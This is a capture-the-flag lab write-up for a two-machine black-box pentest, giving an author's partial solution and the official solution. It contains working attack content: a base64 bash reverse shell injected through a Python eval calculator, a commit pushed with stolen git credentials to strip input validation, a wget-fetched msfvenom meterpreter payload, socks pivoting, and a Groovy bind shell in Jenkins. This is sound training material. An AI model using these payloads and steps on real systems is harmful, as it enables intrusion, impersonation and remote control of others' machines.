---
description: >-
  This exercise will help you understand how to perform pentests in a practical
  environment and how to perform pivoting via metasploit.
---

# Black-box Penetration Test 2

In this lab you will pentest a webapp and exploit a remote code execution vulnerability in the backend to gain shell access and read the flag. From there you would be able to access another machine accessible via this target machine. You have to get shell access to that second machine by exploiting the unprotected automation server.

## Lab Environment

In this lab environment, the user is going to get access to a Kali GUI instance. A web server can be accessed using the tools installed on Kali on [http://online-calc.com](http://online-calc.com). However, there is another machine in the setup which is not accessible from the Kali machine but is accessible from the web server.

**Objective:** Compromise both machines to retrieve the flags!

## Tools

The best tools for this lab are:

* dirb
* Metasploit Framework
* Proxychains
* A Web Browser

## My Solution

Pinging the website [http://online-calc.com/](http://online-calc.com) gives us an IP of 192.9.232.3

![](<../../../../.gitbook/assets/image (11) (1) (1).png>)

We'll run an nmap scan against the target

```bash
nmap -sC -sV -O -p1-10000 online-calc.com
```

There is an Apache 2.4.29 HTTP server running on Port 80

![](<../../../../.gitbook/assets/image (3).png>)

Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed

![](<../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17

There's also a Git repository and an online calculator. So probably the project can be found here

![](<../../../../.gitbook/assets/image (37) (1) (1) (1).png>)

According to this [article](https://testdriven.io/blog/what-is-werkzeug/):

> Werkzeug is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python.
>
> A WSGI (Web Server Gateway Interface) server is necessary for Python web applications since a web server cannot communicate directly with Python. WSGI is an interface between a web server and a Python-based web application.
>
> Put another way, Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server

Let us explore each of these services beginning with port 80

![](<../../../../.gitbook/assets/image (12) (1).png>)

Port 5000 hosts the actual online calculator

![](<../../../../.gitbook/assets/image (21) (1) (1) (1).png>)

There's an error message when visiting port 8000

![](<../../../../.gitbook/assets/image (28) (1) (1).png>)

One thing that stood out in the nmap scan was this file path

![](<../../../../.gitbook/assets/image (43) (1) (1) (1) (1).png>)

When you visit /.git itself, you receive an error

![](<../../../../.gitbook/assets/image (46) (1) (1) (1) (1).png>)

However, visiting .git/config gives you a file to download

![](<../../../../.gitbook/assets/image (38) (1) (1) (1) (1).png>)

And its file content is interesting

![](<../../../../.gitbook/assets/image (40) (1) (1) (1) (1) (1).png>)

We'll keep these credentials saved just in case they come in handy

Now let's run a web discovery scan against the site for any hidden directories

Nothing interesting on port 80

![](<../../../../.gitbook/assets/image (48) (1) (1).png>)

Nothing interesting on port 5000 either

![](<../../../../.gitbook/assets/image (33) (1) (1) (1).png>)

Now we have something interesting!

![](<../../../../.gitbook/assets/image (41) (1) (1) (1) (1) (1).png>)

We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN

![](<../../../../.gitbook/assets/image (55) (1) (1) (1) (1) (1).png>)

It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.

Thinking about the credentials we do have and the direction we're trying to go, let's take another look at that config file

![](<../../../../.gitbook/assets/image (24) (1) (1) (1).png>)

Is there any chance we could get access to that? Can we clone the repository using Git?

```
git clone http://online-calc.com/projects/online-calc
```

It looks like we can, and we have a couple of files we can take a look at

![](<../../../../.gitbook/assets/image (47) (1) (1) (1).png>)

These first two files seem to be the code that's running on port 800

However we're more interested in this .git folder

![](<../../../../.gitbook/assets/image (16) (1) (1) (1).png>)

![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1) (1).png>)

Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console

Or so I thought :neutral\_face:

Let's check the git logs which shows the commit logs. What we see is interesting, Arbitrary File Read and Remote Code Execution (RCE)

![](<../../../../.gitbook/assets/image (14) (1) (1).png>)

These are , however, fixed. Yet, we can use the following command to view the differences in code

```
git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
```

![](<../../../../.gitbook/assets/image (26) (1) (1) (1) (1).png>)

Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned

Let's check the other commit difference

```
git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
```

![](<../../../../.gitbook/assets/image (20) (1) (1) (1) (1).png>)

Essentially what was added seems to be user-input sanitation via the isValid function

We, however, want remote code execution, so we will modify the code in the API.py file

Comment out the part where there's input validation and commit this change to the repository

![](<../../../../.gitbook/assets/image (31) (1) (1).png>)

```
git status
git add .
git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
```

![](<../../../../.gitbook/assets/image (51) (1) (1) (1) (1).png>)

Git Status

> Displays paths that have differences between the index file and the current HEAD commit, paths that have differences between the working tree and the index file, and paths in the working tree that are not tracked by Git (and are not ignored by gitignore(5)). The first are what you would commit by running git commit; the second and third are what you could commit by running git add before running git commit.

Git add

> This command updates the index using the current content found in the working tree, to prepare the content staged for the next commit.

We're commiting this as Jeremy McCarthy because we have his credentials

Next we'll push these changes to the remote repository and enter in the credentials

![](<../../../../.gitbook/assets/image (53) (1) (1) (1).png>)

We can confirm these changes with curl

```
curl http://online-calc.com:8000/API.py
```

![](<../../../../.gitbook/assets/image (35) (1) (1) (1).png>)

### Reverse Shell

Now we'll prepare our exploit to get a reverse shell on the target machine

It should also be noted the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, so we'll use base64 to encode the payload

![](<../../../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
```

![](<../../../../.gitbook/assets/image (17) (1) (1) (1) (1).png>)

Start a netcat listener

![](<../../../../.gitbook/assets/image (42) (1) (1) (1) (1).png>)

Here's the payload we'll use:

```
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNzUuMTY3LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
```

The above payload decodes the base64 encoded payload we created earlier and passes it to`bash`for executing the reverse shell payload.

Since our payload will be executed by the`eval`function in Python, we have to import Python's`os`module to execute the desired commands

Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\\

![](<../../../../.gitbook/assets/image (50) (1) (1) (1).png>)

![](<../../../../.gitbook/assets/image (19) (1) (1) (1).png>)

Nice, we've got a reverse shell session that is root!

### Getting the first flag

Using the find command saves us time in finding the first flag

```
find / -name flag
```

![](<../../../../.gitbook/assets/image (9) (1) (1).png>)

![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1).png>)

The shell that we have is pretty limited, so it would be in our best interest to gain a meterpreter shell

We'll essentially need to generate a payload with msfvenom, upload the payload to compromised machine and have it execute, thus giving us a meterpreter shell

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.250.81.2 LPORT=9999 -f elf > reverse.elf
```

![](<../../../../.gitbook/assets/image (44) (1) (1).png>)

We'll start an http server on our host and use wget on the compromised host to download the payload and then start a listener with Metasploit

![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10) (1).png>)

![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45) (1) (1).png>)

After starting Metasploit, we'll enter the following commands

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LPORT 9999
set lhost 192.250.81.2
run
```

![](<../../../../.gitbook/assets/image (39) (1) (1) (1) (1).png>)

Now we'll change the payload on the compromised machine to an executable and then run it!

```
chmod +x reverse.elf
./reverse.elf
```

Awesome, we've got ourselves a meterpreter shell!

![](<../../../../.gitbook/assets/image (36) (1) (1) (1) (1).png>)

Now we'll move on to pivoting

### Pivoting

```
ifconfig
```

As we see, we have the compromised machine IP as well as the second machine that was inaccessible to us before: `192.218.10.2`

![](<../../../../.gitbook/assets/image (29) (1) (1) (1) (1).png>)

We will now add this route

![](<../../../../.gitbook/assets/image (18) (1) (1) (1) (1).png>)

Now we need to determine what services are on this second network that we have discovered. We will use a basic TCP port scanner to look for ports

```
background
use auxiliary/scanner/portscan/tcp
show options
```

![](<../../../../.gitbook/assets/image (34) (1) (1) (1).png>)

Running an nmap scan against the second target yields us these results

![](<../../../../.gitbook/assets/image (49) (1) (1) (1).png>)

There must be a firewall or something that is protecting what appears to be a web application

A tool that was mentioned in the instructions was proxychains

We'll see how we can apply that here

### Proxy Chains

So why use proxychains? This [article ](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081)explains it well

Using a socks proxy can be understood from [this](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0) article and [this](https://nullsweep.com/pivot-cheatsheet-for-pentesters/) other one

![](<../../../../.gitbook/assets/image (29) (1) (1) (1).png>)

```
proxychains nmap -sT -P0 192.218.10.2
```

Now these ports are open!

![](<../../../../.gitbook/assets/image (52) (1) (1) (1).png>)

In the solution, port 8080 is supposed to be open. Even after following the solution step by step, I never got an open port 8080.

## Their Solution

**Step 1:** Open the lab link to access the Kali GUI instance.

![1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/1.png)

**Step 2:** Check if the provided machine/domain is reachable.

**Command:**

```
ping -c5 online-calc.com
```

![2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/2.png)

The provided machine is reachable.

**Step 3:** Check open ports on the provided machine.

**Command**

```
nmap -sS -sV online-calc.com
```

![3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3.png) ![3\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_1.png)

On the provided machine, ports 80, 5000 and 8000 are open.

* Apache web server is available on port 80.
* A Python-based web server is available on port 8000.
* The service available on port 5000 is not recognized by Nmap. And that's you can see the long string at the bottom of the port scan output. It's the fingerprint for that service. If you notice the output closely, it's the HTTP response returned by that service and it contains HTML content. So it must be some kind of webapp.

Open the browser and check the responses returned by these above 3 discovered services:

**Port 80**: [http://online-calc.com](http://online-calc.com)

![3\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_2.png)

As expected, Apache is available on this port.

**Port 5000**: [http://online-calc.com:5000](http://online-calc.com:5000)

![3\_3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_3.png)

A calc webapp is available on this port.

**Port 8000**: [http://online-calc.com:8000](http://online-calc.com:8000)

![3\_4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/3\_4.png)

On this port a Python-based HTTP service was available. The response is in JSON format. So this could be some kind of API.

**Step 4:** Performing directory enumeration on the exposed services using **dirb** tool.

**Port 80**: [http://online-calc.com](http://online-calc.com)

**Command**

```
dirb http://online-calc.com
```

![4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/4.png)

There's nothing interesting in the above output.

**Port 5000**: [http://online-calc.com:5000](http://online-calc.com:5000)

**Command**

```
dirb http://online-calc.com:5000
```

![4\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/4\_1.png)

There's nothing interesting in the above output.

**Port 8000**: [http://online-calc.com:8000](http://online-calc.com:8000)

**Command**

```
dirb http://online-calc.com:8000
```

![4\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/4\_2.png)

The above output does contain some interesting information. Notice that there are 2 exposed resources which look quite interesting from the perspective of a pentester:

* `/.git/`: Probably there are some more files in the exposed **.git** directory
* `/console`: This could give access to werkzeug's debugger console and give us an easy RCE!

Let's try to access`/console`and see if it provides unauthenticated access or not:

![4\_3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/4\_3.png)

As you can see the console is locked and requires a PIN. Since the PIN is not known, and brute forcing it is not feasible, since Werkzeug only allows a few attempts after which [the debugger needs to be started](https://werkzeug.palletsprojects.com/en/2.0.x/debug/#debugger-pin)!

Let's use **dirb** to explore files in the exposed`/.git`folder:

**Command:**

```
dirb http://online-calc.com/.git
```

![4\_4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/4\_4.png)

Notice that`config`and`index`files are also exposed!

**Step 5:** Retrieving git config from the target machine.

Let's retrieve the git config and see if there's anything interesting in there:

**Command:**

```
curl http://online-calc.com:8000/.git/config
```

![5](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/5.png) ![5\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/5\_1.png)

Notice that the git config contains details including the credentials of a user named **Jeremy McCarthy**:

**Email:** jeremy@dummycorp.com **Username:** jeremy **Password:** diamonds

The git config file also contains the URL of the remote origin:

**Remote Origin URL**: [http://online-calc.com/projects/online-calc](http://online-calc.com/projects/online-calc)

**Step 6:** Cloning the remote repository.

Use the following command to clone the remote repository:

**Command:**

```
git clone http://online-calc.com/projects/online-calc
```

![6](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/6.png)

**Command:**

```
ls
```

Notice that the git repository has been cloned successfully!

Checking the files present in the cloned repository:

**Command:**

```
cd online-calc/
ls
```

![6\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/6\_1.png)

There are 2 files present in the cloned repository: - API.py - utils.py

Looks like this is the repository containing the code running on port 8000. This fact would be apparent as we make progress with our investigation of the repository in the following steps.

**Step 7:** Checking the git logs.

Let's check the git logs to get some more context on the cloned repository and see if anything interesting can be located in the commit history:

**Command:**

```
git log
```

![7](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/7.png)

Notice that the commit logs did contain some interesting information. Seems like there were 2 pressing issues with the code in this repository: - Arbitrary File Read - Remote Code Execution (RCE)

Both of the issues seem to be fixed in the subsequent commits.

**Step 8:** Checking the code changes made to fix the arbitrary file read vulnerability.

Use the following command to list the changes between the commit when the arbitrary file read vulnerability was fixed and the commit just before it:

**Command:**

```
git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
```

![8](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/8.png)

Notice that`send_from_directory`function is used to send any file requested from the root directory of the **Flask** server and if the requested path contains`..`or`%2E`, a`404`response is returned!

**Step 9:** Checking the code changes made to fix the RCE vulnerability.

Use the following command to list the changes between the commit when the RCE vulnerability was fixed and the commit just before it:

**Command:**

```
git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
```

![9](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/9.png)

![9\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/9\_1.png)

Notice that in order to fix the bug, a function named`isValid`was added to the code and in the`evaluate`function, the`isValid`function is called before the user-supplied data is passed to the`eval`function.

Also notice that the`/`character in the user input is being replaced by`* 1.0 /`in the`evaluate`function.

**Step 10:** Modify the code in the API.py and make it vulnerable to RCE again.

Open the **API.py** file in a text editor of your choice. We are using **vim**:

Command:

```
vim API.py
```

Now comment the input validation check before the call to`eval`:

![10](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/10.png)

Now commit these changes to the repository:

**Commands:**

```
git status
git add .
git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
```

![10\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/10\_1.png)

The above commands would commit the changes to the repository with the author name and email set to that of Jeremy McCarthy's.

Now let's push these changes to the remote repository:

**Command:**

```
git push
```

![10\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/10\_2.png)

Upon running the above command, you would be asked for the credentials before making changes to the remote repository. If you remember, the git config we retrieved previously (in **Step 5**) had the credentials for the user named **Jeremy McCarthy**. Those credentials would work and the code should be pushed to the remote repository after successful authentication!

If you notice the output to the push command, you would see some commands being executed. Looks like the code is being updated in the webapp in real-time. That can be confirmed by pulling API.py from the Flask server:

**Command:**

```
curl http://online-calc.com:8000/API.py
```

![10\_3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/10\_3.png)

![10\_4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/10\_4.png)

Notice that the call to`isValid`function has been commented out. So the changes we pushed have been applied to the webapp in real-time, as we speculated!

**Step 11:** Preparing the exploit to get a reverse shell session on the target machine.

Checking the IP address of the provided Kali instance:

**Command:**

```
ip addr
```

![11](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/11.png)

Notice that there are 2 interfaces (excluding the loopback interface) on the provided Kali instance namely: **eth0** and **eth1**.

The target machine ([online-calc.com](http://online-calc.com)) is on the same network as that of **eth1**. So we will use the IP of that interface in this exploit:`192.196.85.2`

Since the`/`characters in the user payload would be converted to`* 1.0 /`by the`evaluate`function, we will base64-encode the payload:

**Command:**

```
echo 'bash -c "bash -i >& /dev/tcp/192.196.85.2/4444 0>&1"' | base64
```

![11\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/11\_1.png)

**Note:** Make sure you replace the IP in the above command with the IP of your Kali GUI instance. Otherwise the exploit wouldn't work!

**Step 12:** Exploiting the RCE to get a reverse shell.

Once the payload has been base64-encoded, start a netcat listener on one of the terminals of the provided Kali instance:

**Command:**

```
nc -lvp 4444
```

![12](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/12.png)

Copy the following payload:

**Payload:**

```
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
```

![12\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/12\_1.png)

**Note:** - Press **CTRL**+**SHIFT**+**ALT** in order to copy the payload to the clipboard of the Kali instance. - Make sure to replace the base64-encoded value in the above payload since the IP address of your Kali GUI instance might be different. If you copy the payload as is, chances are that it might not work due to the same reason.

The above payload decodes the base64 encoded payload we created in the previous step and passes it to`bash`for executing the reverse shell payload. Since our payload will be executed by the`eval`function in Python, that's why we are importing Python's`os`module to execute the desired commands.

Now paste the copied payload to the textbox in the calculator webapp and press the`=`button to supply the payload to the backend:

![12\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/12\_2.png)

This should trigger the bug and get us the reverse shell! Once the payload has been supplied, check the terminal on which the netcat listener was started:

![12\_3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/12\_3.png)

We've got a reverse shell session from the target machine!

Looks like we've got a **root** shell:

**Command:**

```
id
```

![12\_4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/12\_4.png)

**Step 13:** Retrieving the flag from the target machine.

Let's find the flag from this machine:

**Command:**

```
find / -iname *flag* 2>/dev/null
```

![13](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/13.png)

Notice the very first entry of the output:`/tmp/flag`. This file contains the flag.

Let's read the flag:

![13\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/13\_1.png)

**Flag:** 3b2b474c06380f696b38c1498f795e054374

**Step 14:** Generating payload to gain a meterpreter session on the compromised machine.

Even though we have compromised the target machine, we are still limited in the things we can do with the normal shell session. It would be quite good to gain a meterpreter shell session instead to carry out further exploitation.

Use the following command to generate a`reverse_tcp`payload to get back a meterpreter shell session (an ELF binary):

**Command:**

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin
```

![14](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/14.png)

The payload is now ready and saved to the file named`payload.bin`.

**Command:**

```
file payload.bin
```

It's an 64-bit ELF binary, as indicated by the above command!

**Step 15:** Downloading the payload binary on the compromised target machine.

We will start a Python-based file server on the Kali instance and serve the generated payload binary:

**Command:**

```
python3 -m http.server 80
```

![15](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/15.png)

Now we can download the payload binary on the compromised target machine using`wget`utility on the reverse shell session we had gained in **Step 12**.

**Commands:**

```
wget http://192.196.85.2/payload.bin
file payload.bin
chmod +x payload.bin
```

![15\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/15\_1.png)

The above commands download the payload binary from the Kali instance, check the file type (just confirming if the file is properly downloaded or got corrupted) and make it executable.

**Note:** If you check the Python-based file server, you can notice the request to download the payload file here as well:

![15\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/15\_2.png)

This can become handy in case of blind exploitation scenarios where we can execute commands but cannot see the output.

**Step 16:** Gaining a meterpreter session on the target machine.

So by now everything is ready on the target machine. Now all we need to do is set up a multi handler on the Kali instance and gain the meterpreter session by executing the payload on the target machine.

Use the following commands to setup a multi handler on the Kali instance:

**Commands:**

```
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.196.85.2
set LPORT 5555
run
```

![16](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/16.png)

The above set of commands would have started the metasploit framework and configured the options for`exploit/multi/handler`module: - The payload is set to`linux/x64/meterpreter/reverse_tcp`(we generated this payload using **msfvenom**) - LHOST and LPORT are set to the same values we used for generating the payload via **msfvenom**.

Now the reverse TCP handler is running on the Kali instance, we can execute the payload binary on the compromised target machine:

**Command:**

```
./payload.bin
```

![16\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/16\_1.png)

Check the terminal in which the reverse TCP handler was running:

![16\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/16\_2.png)

Notice that we have received a meterpreter session! This will aid us to proceed with the exploitation.

**Step 17:** Checking the list of interfaces on the compromised target machine.

**Command:**

```
ifconfig
```

![17](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/17.png)

![17\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/17\_1.png)

Notice that there are 2 interfaces (excluding the loopback interface) namely:`eth0`and`eth1`. And one of those is in the same network as the Kali machine. The other one is in another network.

**Step 18:** Using the meterpreter session to serve as a socks proxy.

As mentioned in the challenge description, the second machine to be exploited is accessible via the first machine (that is, [online-calc.com](http://online-calc.com)).

Now since we have access to the first target machine, we can easily access the second machine. But if there is some webapp running on that second machine, we can't access it directly, unless we have a proxy setup to relay the request via the compromised target. And that's what we will set up in this step!

Background the meterpreter session and check the meterpreter session identifier:

**Command:**

```
bg
sessions
```

![18](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/18.png)

Now add a route to the network accessible only via the first target machine at [online-calc.com](http://online-calc.com).

**Command:**

```
route add 192.108.156.0/24 1
```

The last argument to the above command is the identifier of the meterpreter shell session.

Now let's use the`socks_proxy`auxiliary module to convert the meterpreter session to serve as a socks proxy:

**Commands:**

```
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run -j
```

![18\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/18\_1.png)

After the above commands, a socks proxy server (having version 4a) would be started on port 9050. It would be started as a background process (since we used the`-j`flag).

Now anything we sent over port 9050 would be sent over to the network we added to the route (that is,`192.108.156.0/24`).

**Step 19:** Scanning the second target machine using the **proxychains** tool.

Let's scan the second target machine (present in the network of the first compromised machine).

We will use proxychains to do the job. By default, proxychains makes use of port`9050`and that's the reason we configured the socks proxy server to listen on that port!

**Command:**

```
proxychains nmap -sT -P0 192.108.156.3
```

![19](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/19.png)

The above command would scan the second target machine using nmap. Since it's not directly reachable we have used **proxychains** tool, which would make use of the proxy server we started, using the meterpreter session to the compromised target machine (at [online-calc.com](http://online-calc.com)).

![19\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/19\_1.png)

Notice that port`8080`is open on the second target machine.

**Step 20:** Configuring the browser to use the socks proxy server.

Let's try and access the service on port 8080 on the second target machine via browser. For that we have to configure the browser to make use of the socks proxy server that we started in **Step 18**.

Go to browser preferences:

![20](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/20.png)

Search for proxy keyword and select the **Network Settings** from the returned results:

![20\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/20\_1.png)

Now configure the browser to use socks proxy as shown in the following image:

![20\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/20\_2.png)

**Step 21:** Accessing the automation server on the second target machine.

Now since everything is configured, we can access the service running on port 8080 on the second target machine in the browser itself.

![21](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/21.png)

It's Jenkins web UI!

**Important Note:** The socks proxy server over meterpreter is quite unstable and it might get disconnected before you completely exploit the second machine. So you might have to gain back the meterpreter shell session on the first target machine (located at [online-calc.com](http://online-calc.com)) and set the proxy server again, in case the meterpreter session dies.

Click on **Manage Jenkins** link on the left panel:

![21\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/21\_1.png)

Scroll down on **Manage Jenkins** page:

![21\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/21\_2.png)

Click on **Script Console** section:

![21\_3](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/21\_3.png)

That should open the Groovy Script console:

![21\_4](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/21\_4.png)

Here we can execute arbitrary scripts and get a shell session! But since we are connected to the Jenkins instance over the socks proxy, we need to start a bind shell on that server and connect to it. The reverse shell won't work since that machine (on which Jenkins is running) doesn't know how to reach back to the Kali instance (which is located in a different network).

Let's do that next.

**Step 22:** Gaining a shell session on the second target machine (running Jenkins).

Paste the following Groovy bind shell payload in the script console and click on the **Run** button to execute the payload:

**Groovy bind shell payload:**

```groovy
int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![22](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/22.png)

**Payload Reference:** [https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell](https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell)

Once the payload has been executed in the Groovy script console, we can use **netcat** utility to connect to the bind shell started on the target machine (running Jenkins) using **proxychains**:

**Command:**

```
proxychains nc -v 192.108.156.3 5555
```

![22\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/22\_1.png)

And that should connect us to the target machine running Jenkins!

**Step 23:** Gathering information about the target machine running Jenkins.

Now we can issue some commands to find out more information about the user we are operating as and the target server machine:

**Command:**

```
id
```

![23](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/23.png)

We are currently running as`jenkins`user.

Let's get the listing of files:

**Command:**

```
ls
```

![23\_1](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/23\_1.png)

Let's get the process listing:

**Command:**

```
ps aux
```

![23\_2](https://assets.ine.com/content/pta-labs/18\_black\_box\_penetration\_test\_2/23\_2.png)

As you can see we can issue commands on the Jenkins server as well.

**And this completes our objective of compromising both machines and gaining shell access on them!**

## Resources

* [https://blog.pentesteracademy.com/socks4-proxy-pivoting-by-metasploit-74436b45392a](https://blog.pentesteracademy.com/socks4-proxy-pivoting-by-metasploit-74436b45392a)
* [https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/](https://securityintelligence.com/posts/socks-proxy-primer-what-is-socks5-and-why-should-you-use-it/)
* [https://nullsweep.com/pivot-cheatsheet-for-pentesters/](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
* [https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0)
* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
* [https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell](https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell)
